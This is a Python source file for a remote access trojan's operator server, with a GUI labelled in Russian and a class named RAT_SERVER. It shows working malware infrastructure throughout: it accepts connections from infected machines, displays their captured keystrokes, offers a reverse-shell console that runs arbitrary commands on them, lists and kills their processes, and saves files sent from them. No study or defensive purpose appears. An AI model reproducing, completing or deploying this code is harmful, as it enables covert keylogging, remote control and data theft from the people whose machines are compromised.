import customtkinter as ctk
import tkinter.messagebox as messagebox
import socket
import json
import threading
from datetime import datetime
import sys
import os
import platform
from tkinter import filedialog

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class RAT_SERVER:
    def __init__(self, host='0.0.0.0', port=3895):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        self.log_text = None
        self.host_entry = None
        self.port_entry = None
        self.status_label = None
        self.start_button = None
        self.stop_button = None
        self.kill_port_button = None
        self.show_info_button = None
        self.theme_switch = None
        self.console_button = None
        self.processes_button = None
        self.get_chrome_history_btn = None
        self.create_gui()

    def create_gui(self):
        self.root = ctk.CTk()
        self.root.title("WHTMEE SERVER")
        self.root.geometry("1000x700")
        self.root.minsize(800, 500)
        try:
            self.root.iconbitmap("server.ico")
        except:
            pass

        
        main_container = ctk.CTkFrame(self.root, fg_color="transparent")
        main_container.pack(fill="both", expand=True, padx=10, pady=10)

        
        left_column = ctk.CTkFrame(main_container, fg_color="transparent")
        left_column.pack(side="left", fill="y", padx=(0, 10))

        
        status_frame = ctk.CTkFrame(left_column, corner_radius=10, fg_color="#1a1a1a")
        status_frame.pack(fill="x", pady=(0, 10))
        
        self.status_label = ctk.CTkLabel(status_frame, text="● OFFLINE", text_color="#ff5555", font=("Segoe UI", 16, "bold"))
        self.status_label.pack(pady=10)

        
        connection_frame = ctk.CTkFrame(left_column, corner_radius=10, fg_color="#1a1a1a")
        connection_frame.pack(fill="x", pady=(0, 10))
        
        ctk.CTkLabel(connection_frame, text="Настройки сервера", font=("Segoe UI", 14, "bold"), text_color="#F0F8FF").pack(pady=(10, 5))
        
        host_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        host_frame.pack(fill="x", padx=10, pady=2)
        ctk.CTkLabel(host_frame, text="Хост:", font=("Segoe UI", 12)).pack(side="left")
        self.host_entry = ctk.CTkEntry(host_frame, width=120, font=("Segoe UI", 12))
        self.host_entry.insert(0, self.host)
        self.host_entry.pack(side="right", padx=(5, 0))
        
        port_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        port_frame.pack(fill="x", padx=10, pady=2)
        ctk.CTkLabel(port_frame, text="Порт:", font=("Segoe UI", 12)).pack(side="left")
        self.port_entry = ctk.CTkEntry(port_frame, width=70, font=("Segoe UI", 12))
        self.port_entry.insert(0, str(self.port))
        self.port_entry.pack(side="right", padx=(5, 0))

        
        controls_frame = ctk.CTkFrame(left_column, corner_radius=10, fg_color="#1a1a1a")
        controls_frame.pack(fill="x", pady=(0, 10))
        
        ctk.CTkLabel(controls_frame, text="Управление", font=("Segoe UI", 14, "bold"), text_color="#F0F8FF").pack(pady=(10, 5))
        
        dark_purple = "#5f3dc4"
        btn_fg = "#fff"
        btn_font = ("Segoe UI", 12, "bold")
        btn_font_small = ("Segoe UI", 11)

        self.start_button = ctk.CTkButton(controls_frame, text="▶ Запустить", command=self.start_server, font=btn_font, height=32, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.start_button.pack(fill="x", padx=10, pady=2)
        
        self.stop_button = ctk.CTkButton(controls_frame, text="■ Остановить", command=self.stop_server, font=btn_font, height=32, state="disabled", fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.stop_button.pack(fill="x", padx=10, pady=2)
        
        self.show_info_button = ctk.CTkButton(controls_frame, text="ℹ Информация", command=self.show_connection_info, font=btn_font_small, height=28, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.show_info_button.pack(fill="x", padx=10, pady=2)
        
        self.kill_port_button = ctk.CTkButton(controls_frame, text="Закрыть порт", command=self.kill_port, font=btn_font_small, height=28, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.kill_port_button.pack(fill="x", padx=10, pady=2)

        
        tools_frame = ctk.CTkFrame(left_column, corner_radius=10, fg_color="#1a1a1a")
        tools_frame.pack(fill="x", pady=(0, 10))
        
        ctk.CTkLabel(tools_frame, text="Инструменты", font=("Segoe UI", 14, "bold"), text_color="#F0F8FF").pack(pady=(10, 5))
        
        self.console_button = ctk.CTkButton(tools_frame, text="Реверс шелл", command=self.open_client_console, font=btn_font_small, height=28, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.console_button.pack(fill="x", padx=10, pady=2)
        
        self.processes_button = ctk.CTkButton(tools_frame, text="Процессы", command=self.show_client_processes, font=btn_font_small, height=28, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.processes_button.pack(fill="x", padx=10, pady=2)
        
        self.get_chrome_history_btn = ctk.CTkButton(tools_frame, text="ScreenShare", command=self.screen_share, font=btn_font_small, height=28, fg_color=dark_purple, hover_color="#4b2996", text_color=btn_fg)
        self.get_chrome_history_btn.pack(fill="x", padx=10, pady=2)

        #светлая тема
        theme_frame = ctk.CTkFrame(left_column, corner_radius=10, fg_color="#1a1a1a")
        theme_frame.pack(fill="x")
        
        ctk.CTkLabel(theme_frame, text="Настройки", font=("Segoe UI", 14, "bold"), text_color="#F0F8FF").pack(pady=(10, 5))
        
        self.theme_switch = ctk.CTkSwitch(
            theme_frame,
            text="Тёмная тема",
            command=self.toggle_theme,
            progress_color="#5f3dc4",
            fg_color="#bdb5d5",
            button_color="#fff",
            button_hover_color="#d1c4e9"
        )
        self.theme_switch.select()
        self.theme_switch.pack(pady=10)

        
        right_column = ctk.CTkFrame(main_container, fg_color="transparent")
        right_column.pack(side="right", fill="both", expand=True)

   
        log_header = ctk.CTkFrame(right_column, fg_color="transparent")
        log_header.pack(fill="x", pady=(0, 5))
        
        ctk.CTkLabel(log_header, text="    Лог нажатий клавиш", font=("Segoe UI", 16, "bold"), text_color="#F0F8FF").pack(side="left")
        
        
        clear_log_btn = ctk.CTkButton(log_header, text="Очистить", command=self.clear_log, font=("Segoe UI", 11), width=80, height=24, fg_color="#ff4444", hover_color="#cc3333", text_color="#fff")
        clear_log_btn.pack(side="right")

        #поле lоga
        log_card = ctk.CTkFrame(right_column, corner_radius=10, fg_color="#1a1a1a")
        log_card.pack(fill="both", expand=True)
        
        self.log_text = ctk.CTkTextbox(log_card, font=("Consolas", 11), corner_radius=8, fg_color="#0f0f0f")
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)
        self.log_text.configure(state="disabled")

    def clear_log(self):
        """Очищает лог нажатий клавиш"""
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
        self.log_message("Лог очищен")

    def toggle_theme(self):
        if ctk.get_appearance_mode() == "Dark":
            ctk.set_appearance_mode("light")
            self.theme_switch.deselect()
        else:
            ctk.set_appearance_mode("dark")
            self.theme_switch.select()

    def show_connection_info(self):
        host = self.host_entry.get()
        port = self.port_entry.get()
        system = platform.system()
        python_version = platform.python_version()
        info = f"""
Информация о сервере:
-------------------
Хост: {host}
Порт: {port}
Активные клиенты: {len(self.clients)}
-------------------
Telegram: @whtmeeee

"""
        messagebox.showinfo("Информация о подключении", info)

    def update_status(self, running):
        if running:
            self.status_label.configure(text="● ONLINE", text_color="#43cc5a")
            self.start_button.configure(state="disabled")
            self.stop_button.configure(state="normal")
            self.host_entry.configure(state="disabled")
            self.port_entry.configure(state="disabled")
        else:
            self.status_label.configure(text="● OFFLINE", text_color="#ff5555")
            self.start_button.configure(state="normal")
            self.stop_button.configure(state="disabled")
            self.host_entry.configure(state="normal")
            self.port_entry.configure(state="normal")

    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.configure(state="normal")
        self.log_text.insert("end", f"[{timestamp}] {message}\n")
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    def kill_port(self):
        try:
            port = int(self.port_entry.get())
            if os.name == 'nt':
                os.system(f'netstat -ano | findstr :{port}')
                os.system(f'for /f "tokens=5" %a in (\'netstat -ano ^| findstr :{port}\') do taskkill /F /PID %a')
            else:
                os.system(f'lsof -ti:{port} | xargs kill -9')
            self.log_message(f"Попытка освободить порт {port}")
            messagebox.showinfo("Информация", f"Попытка освободить порт {port} выполнена")
        except Exception as e:
            self.log_message(f"Ошибка при освобождении порта: {e}")
            messagebox.showerror("Ошибка", f"Не удалось освободить порт: {e}")

    def open_client_console(self):
        win = ctk.CTkToplevel(self.root)
        win.title("Реверс шелл")
        win.geometry("700x400")
        win.resizable(True, True)
        import tkinter as tk
        output_box = ctk.CTkTextbox(win, font=("Menlo", 13), corner_radius=8)
        output_box.pack(fill="both", expand=True, padx=10, pady=(10, 0))
        input_frame = ctk.CTkFrame(win)
        input_frame.pack(fill="x", padx=10, pady=10)
        cmd_entry = ctk.CTkEntry(input_frame, font=("Menlo", 13), width=480)
        cmd_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        send_btn = ctk.CTkButton(input_frame, text="Выполнить", font=("Segoe UI", 13), width=100, fg_color="#5f3dc4", hover_color="#4b2996", text_color="#fff")
        send_btn.pack(side="left")
        def send_command():
            cmd = cmd_entry.get().strip()
            if cmd and self.clients:
                try:
                    self.clients[0].sendall((f'shell:{cmd}\n').encode('utf-8'))
                    output_box.insert("end", f"\n> {cmd}\n")
                    output_box.see("end")
                except Exception as e:
                    output_box.insert("end", f"\n[Ошибка отправки: {e}]\n")
                    output_box.see("end")
        send_btn.configure(command=send_command)
        cmd_entry.bind('<Return>', lambda event: send_command())
     
        self._console_output_box = output_box

    def handle_client(self, client_socket, address):
        try:
            self.log_message(f"Новое подключение от {address}")
            buffer = ""
            current_file = None
            while self.running:
                try:
                    data = client_socket.recv(8192)
                    if not data:
                        break
                    
                   
                    try:
                        message = data.decode('utf-8')
                        if message.startswith('{'):
                            key_data = json.loads(message)
                            
                            if key_data.get('type') == 'file_info':
                                
                                save_dir = filedialog.askdirectory(
                                    title="Выберите папку для сохранения файла",
                                    initialdir=os.path.expanduser("~/Downloads")
                                )
                                
                                if save_dir:
                                    file_name = key_data['file_name']
                                    file_path = os.path.join(save_dir, file_name)
                                    current_file = open(file_path, 'wb')
                                    self.log_message(f"Начинаю сохранение файла {file_name}")
                                else:
                                    self.log_message("Сохранение файла отменено")
                                    current_file = None
                                    
                            elif key_data.get('type') == 'file_end':
                                if current_file:
                                    current_file.close()
                                    current_file = None
                                    self.log_message(f"Файл {key_data['file_name']} успешно сохранен")
                                    
                            elif 'shell_result' in key_data:
                                
                                if hasattr(self, '_console_output_box') and self._console_output_box and self._console_output_box.winfo_exists():
                                    self._console_output_box.insert("end", key_data['shell_result'] + "\n")
                                    self._console_output_box.see("end")
                                    
                                 
                                if hasattr(self, 'processes_window') and self.processes_window and self.processes_window.winfo_exists():
                                    try:
                                        
                                        self.all_processes = [p for p in key_data['shell_result'].split('\n') if p.strip()]
                                        
                                        
                                        def update_gui():
                                            try:
                                                if (hasattr(self, 'processes_window') and 
                                                    self.processes_window and 
                                                    self.processes_window.winfo_exists() and
                                                    hasattr(self, 'process_dropdown') and 
                                                    self.process_dropdown and 
                                                    self.process_dropdown.winfo_exists()):
                                                    
                                                    process_values = [p.strip('-') for p in self.all_processes if p.strip('-')]
                                                    self.process_dropdown.configure(values=process_values)
                                                    
                                                    if (hasattr(self, 'search_entry') and 
                                                        self.search_entry and 
                                                        self.search_entry.winfo_exists() and 
                                                        self.search_entry.get()):
                                                        self.filter_processes()
                                                    elif (hasattr(self, 'processes_output_box') and 
                                                          self.processes_output_box and 
                                                          self.processes_output_box.winfo_exists()):
                                                        self.processes_output_box.delete("1.0", "end")
                                                        self.processes_output_box.insert("end", key_data['shell_result'])
                                            except Exception as e:
                                                self.log_message(f"Ошибка обновления GUI: {e}")
                                        
                                        
                                        self.root.after(0, update_gui)
                                        
                                    except Exception as e:
                                        self.log_message(f"Ошибка обновления списка процессов: {e}")
                            else:
                                self.log_message(f"Клиент {address}: {key_data['key']}")
                                
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        
                        if current_file:
                            current_file.write(data)
                            
                except socket.error as e:
                    self.log_message(f"Ошибка сокета при работе с клиентом {address}: {e}")
                    break
                except Exception as e:
                    self.log_message(f"Ошибка при работе с клиентом {address}: {e}")
                    
        except Exception as e:
            self.log_message(f"Ошибка при работе с клиентом {address}: {e}")
        finally:
            if current_file:
                current_file.close()
            client_socket.close()
            if client_socket in self.clients:
                self.clients.remove(client_socket)
            self.log_message(f"Клиент {address} отключился")

    def show_shell_result(self, result):
     
        if hasattr(self, '_console_output_box') and self._console_output_box:
            self._console_output_box.insert("end", result + "\n")
            self._console_output_box.see("end")

    def start_server(self):
        try:
            self.host = self.host_entry.get()
            self.port = int(self.port_entry.get())
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            self.update_status(True)
            self.log_message(f"Сервер запущен на {self.host}:{self.port}")
            self.log_message("Ожидание подключений...")
            threading.Thread(target=self.accept_connections, daemon=True).start()
        except Exception as e:
            self.log_message(f"Ошибка запуска сервера: {e}")
            self.update_status(False)
            messagebox.showerror("Ошибка", f"Не удалось запустить сервер: {e}")

    def accept_connections(self):
        while self.running:
            try:
                self.log_message("Ожидание нового подключения...")
                client_socket, address = self.server_socket.accept()
                self.clients.append(client_socket)
                threading.Thread(target=self.handle_client, args=(client_socket, address), daemon=True).start()
                self.log_message(f"Подключение принято от {address}")
            except Exception as e:
                if self.running:
                    self.log_message(f"Ошибка при принятии подключения: {e}")
                break

    def stop_server(self):
        self.running = False
        for client in self.clients:
            try:
                client.close()
            except:
                pass
        self.clients.clear()
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        self.update_status(False)
        self.log_message("Сервер остановлен")

    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()

    def on_closing(self):
        self.stop_server()
        self.root.destroy()

    def show_client_processes(self):
        if not self.clients:
            messagebox.showwarning("Предупреждение", "В данный момент отсутствуют активные подключения")
            return
            
        if hasattr(self, 'processes_window') and self.processes_window and self.processes_window.winfo_exists():
            self.processes_window.destroy()
            
        self.processes_window = ctk.CTkToplevel(self.root)
        self.processes_window.title("Процессы клиента")
        self.processes_window.geometry("900x600")
        self.processes_window.resizable(True, True)
        
        
        def on_processes_window_close():
            if hasattr(self, 'processes_window'):
                self.processes_window.destroy()
                self.processes_window = None
        
        self.processes_window.protocol("WM_DELETE_WINDOW", on_processes_window_close)
        
        
        header_frame = ctk.CTkFrame(self.processes_window, fg_color="transparent")
        header_frame.pack(fill="x", padx=10, pady=(10, 0))
        
        header_label = ctk.CTkLabel(
            header_frame, 
            text="Список активных процессов", 
            font=("Segoe UI", 16, "bold"),
            text_color="#5f3dc4"
        )
        header_label.pack(side="left", padx=10)
        
        # Добавляем поле поиска и выбора процесса
        search_frame = ctk.CTkFrame(self.processes_window, fg_color="transparent")
        search_frame.pack(fill="x", padx=10, pady=(10, 0))
        
        self.search_entry = ctk.CTkEntry(
            search_frame,
            placeholder_text="Поиск процесса...",
            font=("Segoe UI", 13),
            width=300
        )
        self.search_entry.pack(side="left", padx=(0, 10))
        
        search_btn = ctk.CTkButton(
            search_frame,
            text="Найти",
            command=self.filter_processes,
            font=("Segoe UI", 13),
            width=100,
            fg_color="#5f3dc4",
            hover_color="#4b2996",
            text_color="#fff"
        )
        search_btn.pack(side="left")
        
        
        self.process_var = ctk.StringVar()
        self.process_dropdown = ctk.CTkOptionMenu(
            search_frame,
            values=[],
            variable=self.process_var,
            font=("Segoe UI", 13),
            width=200,
            fg_color="#5f3dc4",
            button_color="#4b2996",
            button_hover_color="#3d2377",
            dropdown_fg_color="#2a2a2a",
            dropdown_hover_color="#3d2377",
            dropdown_text_color="#fff"
        )
        self.process_dropdown.pack(side="left", padx=(10, 10))
        
        
        kill_btn = ctk.CTkButton(
            search_frame,
            text="Остановить процесс",
            command=self.kill_selected_process,
            font=("Segoe UI", 13),
            width=150,
            fg_color="#ff4444",
            hover_color="#cc3333",
            text_color="#fff"
        )
        kill_btn.pack(side="left")
        
        
        self.processes_output_box = ctk.CTkTextbox(
            self.processes_window, 
            font=("Menlo", 13), 
            corner_radius=8,
            fg_color="#1a1a1a"
        )
        self.processes_output_box.pack(fill="both", expand=True, padx=10, pady=(10, 0))
        
        
        refresh_btn = ctk.CTkButton(
            self.processes_window, 
            text="Обновить", 
            command=self.refresh_processes, 
            font=("Segoe UI", 13), 
            width=100, 
            fg_color="#5f3dc4", 
            hover_color="#4b2996", 
            text_color="#fff"
        )
        refresh_btn.pack(pady=10)
        
        
        self.all_processes = []
        self.refresh_processes()
        
    def filter_processes(self):
        if not (hasattr(self, 'processes_window') and 
                self.processes_window and 
                self.processes_window.winfo_exists() and
                hasattr(self, 'processes_output_box') and 
                self.processes_output_box and 
                self.processes_output_box.winfo_exists()):
            return
            
        try:
            search_text = self.search_entry.get().lower()
            self.processes_output_box.delete("1.0", "end")
            
            if not search_text:
                
                self.processes_output_box.insert("end", '\n'.join(self.all_processes))
                
                if (hasattr(self, 'process_dropdown') and 
                    self.process_dropdown and 
                    self.process_dropdown.winfo_exists()):
                    process_values = [p.strip('-') for p in self.all_processes if p.strip('-')]
                    self.process_dropdown.configure(values=process_values)
            else:
                
                filtered_processes = [p for p in self.all_processes if search_text in p.lower()]
                self.processes_output_box.insert("end", '\n'.join(filtered_processes))
                
                if (hasattr(self, 'process_dropdown') and 
                    self.process_dropdown and 
                    self.process_dropdown.winfo_exists()):
                    process_values = [p.strip('-') for p in filtered_processes if p.strip('-')]
                    self.process_dropdown.configure(values=process_values)
        except Exception as e:
            self.log_message(f"Ошибка при фильтрации процессов: {e}")
            
    def refresh_processes(self):
        if not (hasattr(self, 'processes_window') and 
                self.processes_window and 
                self.processes_window.winfo_exists() and
                hasattr(self, 'processes_output_box') and 
                self.processes_output_box and 
                self.processes_output_box.winfo_exists()):
            return
            
        try:
            self.processes_output_box.delete("1.0", "end")
            self.processes_output_box.insert("end", "Загрузка процессов...\n")
            self.clients[0].sendall(b'shell:ps aux\n')
        except Exception as e:
            self.processes_output_box.delete("1.0", "end")
            self.processes_output_box.insert("end", f"Ошибка при запросе процессов: {e}\n")
            
    def kill_selected_process(self):
        if not self.clients:
            return
            
        selected_process = self.process_var.get()
        if selected_process:
            try:
                
                self.clients[0].sendall(f'shell:kill_process {selected_process}\n'.encode('utf-8'))
                
                self.refresh_processes()
            except Exception as e:
                self.log_message(f"Ошибка при остановке процесса: {e}")
        else:
            messagebox.showwarning("Предупреждение", "Выберите процесс для остановки")

    def screen_share(self):
        pass
    
def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 3895
    server = RAT_SERVER(port=port)
    server.run()

if __name__ == "__main__":
    main() 